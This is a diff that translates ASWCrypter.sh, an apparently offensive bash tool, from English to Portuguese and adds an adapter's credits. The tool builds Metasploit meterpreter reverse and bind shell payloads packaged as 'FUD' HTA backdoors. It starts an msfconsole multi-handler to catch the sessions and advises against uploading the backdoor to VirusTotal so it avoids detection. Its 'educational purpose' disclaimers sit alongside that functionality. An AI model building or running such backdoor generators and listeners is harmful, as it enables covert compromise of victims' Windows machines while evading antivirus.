@@ -28,11 +28,11 @@ getPATH=`pwd`
 # check dependencies (msfconsole)
 imp=`which msfconsole`
 if [ "$?" -eq "0" ]; then
-echo "[✔]msfconsole found" > /dev/null 2>&1
+echo "[✔]msfconsole identificado" > /dev/null 2>&1
 else
 echo ""
-echo "[X] msfconsole -> not found!"
-echo "[!] This script requires msfconsole to work!"
+echo "[X] msfconsole -> nao identificado!"
+echo "[!] Este script necessita do msfconsole!"
 sleep 2
 exit
 fi
@@ -43,9 +43,9 @@ fi
  
 trap ctrl_c INT
 ctrl_c() {
-echo "[+] CTRL+C PRESSED !"
+echo "[+] CTRL+C PRESSIONADO!"
 sleep 1
-echo "[+] Cleanning generated files..."
+echo "[+] Excluindo arquivos gerados..."
 
 cd $getPATH && rm $getPATH/Base64 > /dev/null 2>&1 && rm $getPATH/shellWithNull > /dev/null 2>&1 && rm $getPATH/output/chars.raw > /dev/null 2>&1 && rm $getPATH/PayloadNametemp.hta > /dev/null 2>&1 && rm $getPATH/buildFrag > /dev/null 2>&1 && rm $getPATH/fragFile > /dev/null 2>&1 
 cd $getPATH && rm $getPATH/fragFile > /dev/null 2>&1
@@ -54,14 +54,14 @@ cd $getPATH && rm $getPATH/buildFrag > /dev/null 2>&1
 #buildFrag
 
 # exit ASWCrypter.sh
-echo "[+] Exit Shellcode Generator..."
+echo "[+] Sair do Gerador de Shellcode..."
 sleep 1
 if [ "$distribution" = "Kali" ]; then
-echo "$CYAN[✔] Stop postgresql service..        [$GREEN OK $CYAN]$RESTORE"
-
+echo "$CYAN[✔] Parar servico do postgresql...        [$GREEN OK $CYAN]$RESTORE"
 service postgresql stop > /dev/null 2>&1
+
 else
-echo "$CYAN[✔] Stop metasploit service..        [$GREEN OK $CYAN]$RESTORE"
+echo "$CYAN[✔] Parar servico do metasploit...        [$GREEN OK $CYAN]$RESTORE"
 /etc/init.d/metasploit stop > /dev/null 2>&1
 fi
 cd $getPATH
@@ -75,11 +75,11 @@ ASWhelp () {
 
 echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 $RED
-Note:      The author does not hold any responsibility for the bad use of this tool,
-           remember this is only for educational purpose.
+Nota:      O autor não tem qualquer responsabilidade pelo mau uso desta ferramenta,
+	   lembre-se que isto é apenas para fins educacionai.
                              $RESTORE
 $CYAN
-Donation : PayPal abedalqader9961@gmail.com
+Donation : PayPal abedalqader9961@gmail.com (Autor original)
 
            bitcoincash:qp4lpvvmd8qsmvp8jx322rgdqksqmwnj75uc5yee5s
 
@@ -91,9 +91,14 @@ Donation : PayPal abedalqader9961@gmail.com
 $RESTORE
 $YELLOW
 
-Help :     If you need any help please let me know ;) :) 
-           Facebook : https://www.facebook.com/crypter1996a
-           Email :    abedalqadersweedan94@gmail.com
+Help :     Se precisar de ajuda, pode me chamar ou chamar o autor original ;) :) 
+           Adaptacao: Andre Henrique
+	   Facebook:  https://www.facebook.com/mrhenrike
+	   Email:     henrique.santos@uniaogeek.com.br
+	   
+	   Autor Original: Abed Alqader Swedan
+	   Facebook: https://www.facebook.com/crypter1996a
+           Email:    abedalqadersweedan94@gmail.com
 $RESTORE
 "
 
@@ -120,12 +125,11 @@ d8'  8b 88'  YP 88   I8I   88 d8P  Y8 88   8D  8b  d8' 88   8D  ~~88~~' 88'     
 YP   YP  8888Y'   8b8'  8d8'    Y88P' 88   YD    YP    88         YP    Y88888P 88   YD 
                                                                                         
 					
-			 $BLUE Coded by $YELLOW AbedAlqader Swedan 
-		         $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
-			 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
+			 $BLUE Criado por $YELLOW AbedAlqader Swedan
+			 $BLUE Adaptado por $YELLOW Andre Henrique	
  $RESTORE
 "
-echo "$RED [+] Select an payload To start: "
+echo "$RED [+] Selecione um payload para iniciar: "
 
 # input payload choise
 echo "$GREEN
@@ -137,7 +141,7 @@ echo "$GREEN
 			[6] windows/x64/meterpreter/reverse_tcp\n$RESTORE"
  
 
-read -p "[!] Select an payload: " choice
+read -p "[!] Selecione um payload: " choice
 case $choice in
 
 1) paylo="windows/shell_bind_tcp" ;;
@@ -148,7 +152,7 @@ case $choice in
 6) paylo="windows/x64/meterpreter/reverse_tcp";;
 *) echo "\"$choice\": is not a valid Option"; sleep 2;;
 esac
-read -p "[!] Enter payload output name [example: HtaASCrypter]: " PayloadName
+read -p "[!] Informe um nome da saida do payload [exemplo: HtaASCrypter]: " PayloadName
 
 echo "[$GREEN+$RESTORE]$YELLOW Building shellcode ...$RESTORE"
 sleep 2
@@ -163,12 +167,11 @@ echo "
 	01000001 01010011 01010111 			01000011 01110010 01111001
 	01110000 01110100 01100101			01110010
 				 
-	                 $BLUE Coded by $YELLOW AbedAlqader Swedan 
-		         $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
-			 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com
+	                  $BLUE Criado por $YELLOW AbedAlqader Swedan
+			  $BLUE Adaptado por $YELLOW Andre Henrique
 "
 
-echo "[$GREEN+$RESTORE]$YELLOW Running a Python Script...$RESTORE "
+echo "[$GREEN+$RESTORE]$YELLOW Executando o Script em Python...$RESTORE "
 sleep 2
 store=`cat $getPATH/output/chars.raw | awk {'print $7'}`
 getBase64=`echo $store | awk -F "," '{print $1}'| sed 's/.$//'`
@@ -198,8 +201,8 @@ read -p "Do you want run multi-handler? [Y/N]: " serv
 
    if [ "$serv" = "y" ] || [ "$serv" = "Y" ] ; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[+] Start a multi-handler..."
-      echo "[+] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[+] Iniciando o multi-handler..."
+      echo "[+] Pressione [ctrl+c] ou [exit] para 'sair' do shell meterpreter"
       xterm -T " PAYLOAD MULTI-HANDLER " -geometry 100x50 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
              
       sleep 2
@@ -209,7 +212,7 @@ read -p "Do you want run multi-handler? [Y/N]: " serv
  
 else
 
-  echo "[x] Abort module execution .."
+  echo "[x] Abortar executacao de modulo..."
   sleep 2
    
   clear
@@ -219,7 +222,7 @@ fi
  
 ASWexit () {
 
-echo "$CYAN[✔] Stoping Services...        [$GREEN OK $CYAN]$RESTORE"
+echo "$CYAN[✔] Parando servicos...        [$GREEN OK $CYAN]$RESTORE"
 sleep 1
 if [ "$distribution" = "Kali" ]; then
 service postgresql stop > /dev/null 2>&1
@@ -240,8 +243,8 @@ exit
  
 
 if [ $(id -u) != "0" ]; then
-  echo "[x] we need to be root to run this script..."
-  echo "[x] execute [ sudo ./ASWCrypter.sh ] on terminal"
+  echo "[x] Eh necessario executar o script como root..."
+  echo "[x] execute [ sudo ./ASWCrypter.sh ] no terminal"
   exit
 else
   :
@@ -262,48 +265,47 @@ $YELLOW
                                 +++++++++++++++++++++
 $RED     $OS|$user$YELLOW|2018|$distribution   	             
 
-	         $BLUE Author:$YELLOW AbedAlqader Swedan
-		 $BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
-		 $BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
- 		 $BLUE Version:$YELLOW 1.0              
+	         $BLUE Criado por $YELLOW AbedAlqader Swedan
+		 $BLUE Adaptado por $YELLOW Andre Henrique	
+ 		 $BLUE Version:$YELLOW 1.2              
 ";
 echo "   $RED         
-                     PLEASE DON'T UPLOAD BACKDOOT TO WWW.VIRUSTOTAL.COM"
-echo "                       YOU CAN UPLOAD BACKDOOR TO WWW.NODISTRIBUTE.COM   "
+                     POR FAVOR, NAO FACA O UPLOAD DESTE PAYLOAD NO WWW.VIRUSTOTAL.COM"
+echo "                       MAS, VOCE PODE UPAR NO WWW.NODISTRIBUTE.COM   "
 echo "
                    ++++++++++++++++++++++++++++++++++++++++++++++++++++
-                   +  Remember this tool only for educational purpose.+
-                   +    The author does not hold any responsibility   +
-                   +         for the bad use ofthis tool.             +
+                   +  Use a ferramenta somente para fins educadionais.+
+                   +    O autor nao se responsabiliza pelo mal uso    +
+                   +                 desta ferramenta.                +
                    +                                                  +
                    ++++++++++++++++++++++++++++++++++++++++++++++++++++
               	 "
 echo "[=============================================================================]"
 sleep 2
 	if [ "$distribution" = "Kali" ]; then
-	echo "$CYAN[✔] Starting postgresql service.. [$GREEN OK $CYAN]$RESTORE"
+	echo "$CYAN[✔] Iniciando postgresql service.. [$GREEN OK $CYAN]$RESTORE"
         sleep 1
 	service postgresql start    > /dev/null 2>&1
 	else
         sleep 1
-	echo "$CYAN[✔] Starting metasploit service.. [$GREEN OK $CYAN]$RESTORE"
+	echo "$CYAN[✔] Iniciando metasploit service.. [$GREEN OK $CYAN]$RESTORE"
 	/etc/init.d/metasploit start      > /dev/null 2>&1
         sleep 1
 	fi
         sleep 1				
 	echo "$CYAN[✔] Shellcode Generator ..        [$GREEN OK $CYAN]$RESTORE"
 	sleep 1
-        echo "$CYAN[✔] Check User $user [$GREEN OK $CYAN]$RESTORE"
-	echo "        $RED[+] Choose option To start:$RESTORE"
+        echo "$CYAN[✔] Check usuario $user [$GREEN OK $CYAN]$RESTORE"
+	echo "        $RED[+] Escolha uma opcao para iniciar:$RESTORE"
         echo "$YELLOW
-                           [G]Generate Backdoor $GREEN[FUD]$YELLOW
+                           [G]Gerar Backdoor $GREEN[FUD]$YELLOW
                            [H]Help
                            [E]Exit$RESTORE
                           
 "
      
 	 
-	read -p "       $YELLOW [+] Enter Your Choose:" choice
+	read -p "       $YELLOW [+] Insira a opcao:" choice
 	clear;
         echo "
 
@@ -317,14 +319,13 @@ sleep 2
 		   (_)         (_)      (_)_  _  _  _(_)    (_)_(_)   (_)_(_)  
 		   (_)         (_)        (_)(_)(_)(_)        (_)       (_)                               
 			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-			|C|o|d|e|d|B|y|A|b|e|d|A|l|q|a|d|e|r|S|w|e|d|a|n|
+			|  Modificado por Andre Henrique by Uniao Geek  |
 			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-                                 $RED      A                     S W $RESTORE                                         
+                                 $RED      A S W $RESTORE                                         
                               
-		        $BLUE Author:$YELLOW AbedAlqader Swedan
-			$BLUE Fb:$YELLOW https://www.fb.com/crypter1996a	
-			$BLUE Email:$YELLOW abedalqadersweedan94@gmail.com	
-	 		$BLUE Version:$YELLOW 1.0	
+		        $BLUE Criado por $YELLOW AbedAlqader Swedan
+			$BLUE Adaptado por $YELLOW Andre Henrique	
+	 		$BLUE Version:$YELLOW 1.2	
 " 
 	case $choice in
 	G) generateShell ;;
@@ -333,7 +334,7 @@ sleep 2
 	E) ASWexit ;;
         h) ASWhelp ;;
 	H) ASWhelp ;;
-	*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
+	*) echo "\"$choice\": nao eh uma opcao validan"; sleep 2 ;;
 	esac
 
 
